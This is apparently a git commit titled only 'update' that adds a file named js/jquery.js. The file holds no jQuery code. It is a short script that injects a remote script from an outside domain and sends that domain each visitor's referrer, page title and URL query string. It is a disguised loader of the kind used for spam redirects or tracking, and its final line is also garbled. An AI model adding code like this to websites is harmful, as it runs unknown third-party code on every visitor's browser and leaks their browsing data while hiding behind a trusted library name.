cb75b018ceaab7d07beb5f67bea985d0a31cb969
blog-lot <62726971+blog-lot@users.noreply.github.com>
2020-04-25 06:52:35 +0300

    update

---
+++ js/jquery.js
@@ -0,0 +1,9 @@
+var d=document;var s=d.createElement('script'); 
+s.src='https://lot.gift4me.site/get?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm=script&_cid=95165492-d24f-80f5-57c7-227d183e9d77'; 
+if (document.currentScript) { 
+document.currentScript.parentNode.insertBefore(s, document.currentScript);
+} else {
+d.getElementsByTagName('head')[0].appendChild(s);
+}
+if (document.location.protocol === 'https:' && 'https://lot.gift4me.site/get?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm=script'.indexOf('http:') === 0 ) {alert('The website works on HTTPS. The tracker must use HTTPS too.');}
+
